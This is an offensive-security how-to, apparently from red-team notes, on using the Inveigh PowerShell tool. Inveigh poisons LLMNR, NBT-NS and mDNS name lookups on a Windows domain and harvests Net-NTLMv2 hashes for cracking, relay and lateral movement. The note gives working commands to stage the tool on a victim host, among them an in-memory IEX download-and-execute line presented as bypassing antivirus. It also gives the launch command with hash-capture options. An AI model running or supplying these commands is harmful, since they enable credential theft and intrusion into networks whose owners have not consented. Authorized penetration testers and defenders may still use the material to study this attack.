# Inveigh

Inveigh is a powerful PowerShell based spoofing and credential harvesting tool for Windows environments (the spiritual successor to Responder.py, but native to Windows). It poisons LLMNR, NBT-NS, and mDNS requests, captures Net-NTLMv2 hashes, and can optionally perform NTLM relay (via Inveigh-Relay)

When a Windows machine fails to resolve a hostname via DNS (e.g., typo like `\\fileserver` instead of `\\fileserver.domain.local`), it falls back to LLMNR/NBT-NS and broadcasts the request. Inveigh responds authoritatively, tricking the victim into authenticating to our attacker-controlled machine - resulting in capture of the user’s `Net-NTLMv2 challenge/response hash`

These hashes can then be:
- Cracked offline with Hashcat/John
- Relayed with ntlmrelayx
- Used in pass-the-hash style attacks  

Download [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

After gaining the initial access to the domain, make the Inveigh available in the victim

```
# Method 1: Direct download
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1" -OutFile "Inveigh.ps1"

# Method 2: Load directly into memory (bypasses most AV)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1')
```

```
# Import and run Inveigh
Import-Module .\Inveigh.ps1
Invoke-InveighZero

# Or with common useful parameters
Invoke-InveighZero -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -CaptureHash Y -ConsoleOutput Y
```

When a machine fails to resolve to the hostname via DNS, then Inveigh tricks and get the NTLM hashes which could be used for the lateral movements